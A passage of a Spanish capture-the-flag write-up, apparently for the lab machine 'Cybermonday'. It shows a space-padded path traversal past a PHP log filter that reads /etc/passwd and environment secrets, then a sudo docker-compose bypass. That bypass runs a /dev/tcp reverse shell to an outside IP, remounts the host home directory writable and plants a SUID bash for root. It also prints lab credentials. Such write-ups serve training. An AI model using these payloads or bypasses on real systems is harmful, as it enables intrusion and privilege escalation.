        if($webhook_find->action != "createLogFile")
        {
            return $this->response(["status" => "error", "message" => "This webhook was not created to manage logs"], 400);
        }

        $actions = ["list", "read"];

        if(!isset($this->data->action) || empty($this->data->action))
        {
            return $this->response(["status" => "error", "message" => "\"action\" not defined"], 400);
        }

        if($this->data->action == "read")
        {
            if(!isset($this->data->log_name) || empty($this->data->log_name))
            {
                return $this->response(["status" => "error", "message" => "\"log_name\" not defined"], 400);
            }
        }

        if(!in_array($this->data->action, $actions))
        {
            return $this->response(["status" => "error", "message" => "invalid action"], 400);
        }

        $logPath = "/logs/{$webhook_find->name}/";

        switch($this->data->action)
        {
            case "list":
                $logs = scandir($logPath);
                array_splice($logs, 0, 1); array_splice($logs, 0, 1);

                return $this->response(["status" => "success", "message" => $logs]);
            
            case "read":
                $logName = $this->data->log_name;

                if(preg_match("/\.\.\//", $logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logName = str_replace(' ', '', $logName);

                if(stripos($logName, "log") === false)
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                if(!file_exists($logPath.$logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logContent = file_get_contents($logPath.$logName);
                


                return $this->response(["status" => "success", "message" => $logContent]);
        }
    }
}
```

En la primera parte requiere una solicitud a un apiKeyAuth y luego obtiene el webhook.

Si no existe dicho apiKeyAuth devuelve un error:

```php
if(!$webhook_find)
        {
            return $this->response(["status" => "error", "message" => "Webhook not found"], 404);
        }

        if($webhook_find->action != "createLogFile")
        {
            return $this->response(["status" => "error", "message" => "This webhook was not created to manage logs"], 400);
        }
```

Luego valida si el `action` tiene el valor correcto o si esta vacio, si el action tiene el valor `read` se va a asegurar de que tenga un `log_name`.

Y por ultimo `$log_path` se configura en funcion a lo que se cree el webhook y tambien cambia segun la data que se le pase a `action`. 

```php
$logPath = "/logs/{$webhook_find->name}/";

        switch($this->data->action)
```

Si el `action` en el endpoint `/logs/webhook_find->name` es list, devolvera como output el contenido de la carpeta `logs`.

```php
case "list":
                $logs = scandir($logPath);
                array_splice($logs, 0, 1); array_splice($logs, 0, 1);

                return $this->response(["status" => "success", "message" => $logs]);
```

Pero si el `action` es read, elimina cualquier espacio y directory path traversal comun `../`. 

```php
case "read":
                $logName = $this->data->log_name;

                if(preg_match("/\.\.\//", $logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logName = str_replace(' ', '', $logName);

                if(stripos($logName, "log") === false)
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                if(!file_exists($logPath.$logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logContent = file_get_contents($logPath.$logName);
   


                return $this->response(["status" => "success", "message" => $logContent]);
        }
```

Ahora vamos a buscar nuestro `apikeyauth` ya que para realizar todas estas peticiones y interactuar con la api necesitamos pasarle como cabezera el valor de esa apikey.

Encontramos esta funcion en `/helpers/Api.php`

```php
public function apiKeyAuth()
    {
        $this->api_key = "22892e36-1770-11ee-be56-0242ac120002";

        if(!isset($_SERVER["HTTP_X_API_KEY"]) || empty($_SERVER["HTTP_X_API_KEY"]) || $_SERVER["HTTP_X_API_KEY"] != $this->api_key)
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    }
```

Nos dice que como cabezera le tenemos que pasar `x-api-key` y el valor es:

- 22892e36-1770-11ee-be56-0242ac120002

Antes de todo este vamos a entender como funciona esta api y que endpoints tenemos... esta informacion la encontramos en `/app/Routes/Router.php`.

```php
return [
            "get" => [
                "/" => "IndexController@index",
                "/webhooks" => "WebhooksController@index"
            ],
            "post" => [
                "/auth/register" => "AuthController@register",
                "/auth/login" => "AuthController@login",
                "/webhooks/create" => "WebhooksController@create",
                "/webhooks/:uuid" => "WebhooksController@get",
                "/webhooks/:uuid/logs" => "LogsController@index"
            ],
            "delete" => [
                "/webhooks/delete/:uuid" => "WebhooksController@delete",
            ]
```

### LFI (Local File Inclusion)

- Primero crear un webhook con el action `createLogFile`
- Segundo crear un log pasando el identificador del webhook y como datos un `log_name` seguido de un contenido `log_content`
- Tercero incorporar el `x-api-key` para leer la carpeta logs pasando en `action` el valor list.
- Cuarto leer el contenido del log que anteriormente se creo con `/webhooks/$UUID/logs` pasando como parametro action:`read` log_name:`<nombre del log>`

- Crear webhook

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks/create" -d '{"name": "test", "description":"test", "action":"createLogFile"}' -H 'Content-Type: application/json' -H "x-access-token: $TOKEN" | jq .
{
  "status": "success",
  "message": "Done! Send me a request to execute the action, as the event listener is still being developed.",
  "webhook_uuid": "33c3965c-a2b6-44f4-ae0a-6594334e4dd8"
}
```

- Crear log

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks/33c3965c-a2b6-44f4-ae0a-6594334e4dd8" -d '{"log_name": "mrincreible", "log_content":"mrincreible test"}' -H 'Content-Type: application/json' -H "x-access-token: $TOKEN" | jq .
{
  "status": "success",
  "message": "Log created"
}
```

- Cabezera x-api-key y listar contenido

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks/33c3965c-a2b6-44f4-ae0a-6594334e4dd8/logs" -d '{"action": "list"}' -H 'Content-Type: application/json' -H "x-access-token: $TOKEN" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" | jq .
{
  "status": "success",
  "message": [
    "mrincreible-1762910581.log"
  ]
}
```

- Leer log mrincreible-1762910581.log

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks/33c3965c-a2b6-44f4-ae0a-6594334e4dd8/logs" -d '{"action": "read", "log_name": "mrincreible-1762910581.log"}' -H 'Content-Type: application/json' -H "x-access-token: $TOKEN" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" | jq .
{
  "status": "success",
  "message": "mrincreible test\n"
}
```

Ahora llegamos a la parte vulnerable del codigo LogsController.php, podemos realizarlo de esta manera: 

Utiliza la funcion str_replace() para remplazar los espacios... es decir que si le pasamos asi `. ./. ./` lo va unir `../../` y se va a convertir en un `LFI` puro, evadiendo esta parte del codigo:

```php
if(preg_match("/\.\.\//", $logName))
```

Esto imposiblita el recorrido de rutas y anula esto `../../../../` sin embargo esa funcion str_replace() deshace esa validacion y lo vuelve en su contra.

Y como ultima validacion nos pide lo siguiente:

```php
		if(stripos($logName, "log") === false)
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }
```

El archivo tiene que contener como nombre `log` o incorporarlo en alguna parte del nombre. De modo que al realizar el Directory Path Traversal se cumpla con las condiciones.

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks/33c3965c-a2b6-44f4-ae0a-6594334e4dd8/logs" -d '{"action": "read", "log_name": ".. / .. /logs/ .. /etc/passwd"}' -H 'Content-Type: application/json' -H "x-access-token: $TOKEN" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" | jq .
{
  "status": "success",
  "message": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3
	      :sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:
	      /var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews
	      :x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr
	      /sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x
	      :38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexist
	      ent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
}
```

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks/33c3965c-a2b6-44f4-ae0a-6594334e4dd8/logs" -d '{"action": "read", "log_name": ".. / .. /logs/ .. /proc/self/environ"}' -H 'Content-Type: application/json' -H "x-access-token: $TOKEN" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" | jq .
{
  "status": "success",
  "message": "HOSTNAME=e1862f4e1242\u0000PHP_INI_DIR=/usr/local/etc/php\u0000HOME=/root\u0000PHP_LDFLAGS=-Wl,-O1 -pie\u0000PHP_CFLAGS=-fstack-protector-strong 
	     -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\u0000DBPASS=ngFfX2L71Nu\u0000PHP_VERSION=8.2.7\u0000GPG_KEYS=39B641343D8C104B2B146DC3F
	     9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC\u0000PHP_CPPFLAGS=-fstack-protector-strong -fpi
	     c -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\u0000PHP_ASC_URL=https://www.php.net/distributions/php-8.2.7.tar.xz.asc\u0000PHP_URL=https
	     ://www.php.net/distributions/php-8.2.7.tar.xz\u0000DBHOST=db\u0000DBUSER=dbuser\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
	     :/bin\u0000DBNAME=webhooks_api\u0000PHPIZE_DEPS=autoconf \t\tdpkg-dev \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tmake \t\tpkg-config \t\tre2c\u000
	     0PWD=/var/www/html\u0000PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0\u0000"
}
```

Tambien se lo puede ejecutar asi: `. ./. ./`

```php
if(preg_match("/\.\.\//", $logName))
```

```bash
curl -s "http://webhooks-api-beta.cybermonday.htb/webhooks/33c3965c-a2b6-44f4-ae0a-6594334e4dd8/logs" -d '{"action": "read", "log_name": ". ./. ./logs/. ./. ./proc/self/environ"}' -H 'Content-Type: application/json' -H "x-access-token: $TOKEN" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" | jq .
{
  "status": "success",
  "message": "HOSTNAME=e1862f4e1242\u0000PHP_INI_DIR=/usr/local/etc/php\u0000HOME=/root\u0000PHP_LDFLAGS=-Wl,-O1 -pie\u0000PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\u0000DBPASS=ngFfX2L71Nu\u0000PHP_VERSION=8.2.7\u0000GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC\u0000PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\u0000PHP_ASC_URL=https://www.php.net/distributions/php-8.2.7.tar.xz.asc\u0000PHP_URL=https://www.php.net/distributions/php-8.2.7.tar.xz\u0000DBHOST=db\u0000DBUSER=dbuser\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000DBNAME=webhooks_api\u0000PHPIZE_DEPS=autoconf \t\tdpkg-dev \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tmake \t\tpkg-config \t\tre2c\u0000PWD=/var/www/html\u0000PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0\u0000"
}
```

En el /proc/self/enrivon vemos una variable de entorno `DBPASS=ngFfX2L71Nu` que tiene una contraseña... vamos a probarlo para conectarnos via ssh con el usuario john.

### Shell como john

Ahora que tenemos acceso a una shell interactiva como el usuario john, lo primero que voy a probar es si contiene algun permiso a nivel de `SUDOERS`.

```bash
john@cybermonday:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on localhost:
    (root) /opt/secure_compose.py *.yml
```

### SUDO

Vemos que a john se le permite ejecutar un script en python `/opt/secure_compose.py` en combinacion con un archivo .yml o YAML.. Vamos a seguir investigando de que se trata leyendo el codigo.

```python
#!/usr/bin/python3
import sys, yaml, os, random, string, shutil, subprocess, signal

def get_user():
    return os.environ.get("SUDO_USER")

def is_path_inside_whitelist(path):
    whitelist = [f"/home/{get_user()}", "/mnt"]

    for allowed_path in whitelist:
        if os.path.abspath(path).startswith(os.path.abspath(allowed_path)):
            return True
    return False

def check_whitelist(volumes):
    for volume in volumes:
        parts = volume.split(":")
        if len(parts) == 3 and not is_path_inside_whitelist(parts[0]):
            return False
    return True

def check_read_only(volumes):
    for volume in volumes:
        if not volume.endswith(":ro"):
            return False
    return True

def check_no_symlinks(volumes):
    for volume in volumes:
        parts = volume.split(":")
        path = parts[0]
        if os.path.islink(path):
            return False
    return True

def check_no_privileged(services):
    for service, config in services.items():
        if "privileged" in config and config["privileged"] is True:
            return False
    return True

def main(filename):

    if not os.path.exists(filename):
        print(f"File not found")
        return False

    with open(filename, "r") as file:
        try:
            data = yaml.safe_load(file)
        except yaml.YAMLError as e:
            print(f"Error: {e}")
            return False

        if "services" not in data:
            print("Invalid docker-compose.yml")
            return False

        services = data["services"]

        if not check_no_privileged(services):
            print("Privileged mode is not allowed.")
            return False

        for service, config in services.items():
            if "volumes" in config:
                volumes = config["volumes"]
                if not check_whitelist(volumes) or not check_read_only(volumes):
                    print(f"Service '{service}' is malicious.")
                    return False
                if not check_no_symlinks(volumes):
                    print(f"Service '{service}' contains a symbolic link in the volume, which is not allowed.")
                    return False
    return True

def create_random_temp_dir():
    letters_digits = string.ascii_letters + string.digits
    random_str = ''.join(random.choice(letters_digits) for i in range(6))
    temp_dir = f"/tmp/tmp-{random_str}"
    return temp_dir

def copy_docker_compose_to_temp_dir(filename, temp_dir):
    os.makedirs(temp_dir, exist_ok=True)
    shutil.copy(filename, os.path.join(temp_dir, "docker-compose.yml"))

def cleanup(temp_dir):
    subprocess.run(["/usr/bin/docker-compose", "down", "--volumes"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    shutil.rmtree(temp_dir)

def signal_handler(sig, frame):
    print("\nSIGINT received. Cleaning up...")
    cleanup(temp_dir)
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Use: {sys.argv[0]} <docker-compose.yml>")
        sys.exit(1)

    filename = sys.argv[1]
    if main(filename):
        temp_dir = create_random_temp_dir()
        copy_docker_compose_to_temp_dir(filename, temp_dir)
        os.chdir(temp_dir)
        
        signal.signal(signal.SIGINT, signal_handler)

        print("Starting services...")
        result = subprocess.run(["/usr/bin/docker-compose", "up", "--build"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Finishing services")

        cleanup(temp_dir)
```

Si observamos detenidamente el codigo bloquea los metodos de escalada de privilegios mas comunes, sin embargo existe una parte que podemos aprovechar a nuestro favor ya que no esta tan sanitizado como tiene que ser.

```python
def check_no_privileged(services):
    for service, config in services.items():
        if "privileged" in config and config["privileged"] is True:
            return False
    return True
```

Esta funcion comprueba si los elementos contienen el indicador `privileged`.

En otras palabras este codigo verifica si el valor de `privileged` coincide con el valor booleano `true`. Docker Compose tambien acepta la cadena `true`. Esto no activaria las medidas de seguridad del script. Entonces evade cualquier funcion de seguridad que tenga el docker-compose.py.

- Si utilizas privileged: true en docker-compose.yml, el contenedor tendrá acceso casi total al sistema anfitrión, lo que es un gran riesgo de seguridad. Esto puede permitir que se ejecute como root en el host, abriendo una ventana para ataques, y es solo recomendable para casos muy específicos, como Docker dentro de Docker.
- `cap_add`: En lugar de usar privileged: true, puedes añadir capacidades específicas que necesita el contenedor con la opción `cap_add`. Esto te permite otorgar solo los privilegios necesarios y no todos.

Pero entonces agregariamos privileged: `true` y `cap_add`: all con esto ya tendriamos privilegios maximos en el host.

```yml
version: "3"
services:
    mrincreible:
      image: cybermonday_api
      command: /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'
      volumes:
       - /home/john:/john:ro
      cap_add:
       - ALL
      privileged: "true"
```

Esto nos devuelve una shell inversa a nuestro netcat y vemos que en la raiz de este contenedor esta nuestra carpeta del usuario john.

No vamos a poder escribir nada dentro del contenedor porque se creo con los permisos de solo lectura, tendriamos que volver a montar el recurso compartido.

```bash
root@498008853e5f:/john# touch test
touch test
touch: cannot touch 'test': Read-only file system
root@498008853e5f:/john# mount | grep john
mount | grep john
/dev/sda1 on /john type ext4 (ro,relatime,errors=remount-ro)
```

Actualmente esta montado en /dev/sda1, vamos a volver a montarlo pero esta vez con permisos de escritura.

```bash
root@498008853e5f:/john# mount -o remount,rw /john
mount -o remount,rw /john
```

Al parecer funcion correctamente, no nos salio ningun error.

```bash
root@498008853e5f:/john# touch test
touch test
root@498008853e5f:/john# ls -l
ls -l
total 12
-rw-r--r-- 1 root root  701 May 29  2023 changelog.txt
drwxrwxrwx 2 root root 4096 Aug  3  2023 logs
-rw-r--r-- 1 root root    0 Nov 14 01:31 test
-rw-r----- 1 root 1000   33 Nov 14 01:08 user.txt
```

Esto es excelente, creamos un archivo con permisos de root. Si abrimos otra terminal como el usuario john y nos volvemos a conectar por ssh notamos lo siguiente:

```bash
john@cybermonday:~$ ls -l
total 12
-rw-r--r-- 1 root root  701 May 29  2023 changelog.txt
drwxrwxrwx 2 root root 4096 Aug  3  2023 logs
-rw-r--r-- 1 root root    0 Nov 13 20:31 test
-rw-r----- 1 root john   33 Nov 13 20:08 user.txt
```

El archivo test se creo correctamente, para conseguir una shell vamos a traernos el binario /bin/bash y vamos a otorgarle los permisos `SUID`.

Copie el `/bin/bash` desde la terminal que abri recien con el usuario john a la carpeta `/home/john`.

```bash
cp /bin/bash mrincreible
```

Y desde el contenedor tengo esto:

```bash
total 1220
-rw-r--r-- 1 root root     701 May 29  2023 changelog.txt
drwxrwxrwx 2 root root    4096 Aug  3  2023 logs
-rwxr-xr-x 1 1000 1000 1234376 Nov 14 01:36 mrincreible
-rw-r--r-- 1 root root       0 Nov 14 01:31 test
-rw-r----- 1 root 1000      33 Nov 14 01:08 user.txt
```

Actualizare el propietario y lo configurare como SetUID/SetGID:

```bash
root@498008853e5f:/john# chown root:root mrincreible
chown root:root mrincreible

root@498008853e5f:/john# chmod 6777 mrincreible
chmod 6777 mrincreible
```

Cuando regresamos a la maquina ya tenemos esto:

```bash
john@cybermonday:~$ ls -l
total 1220
-rw-r--r-- 1 root root     701 May 29  2023 changelog.txt
drwxrwxrwx 2 root root    4096 Aug  3  2023 logs
-rwsrwsrwx 1 root root 1234376 Nov 13 20:36 mrincreible
-rw-r--r-- 1 root root       0 Nov 13 20:31 test
-rw-r----- 1 root john      33 Nov 13 20:08 user.txt
```

```bash
john@cybermonday:~$ ./mrincreible -p
mrincreible-5.1# whoami
root
mrincreible-5.1# id
uid=1000(john) gid=1000(john) euid=0(root) egid=0(root) groups=0(root),1000(john)
```

Somos root!!!!.



















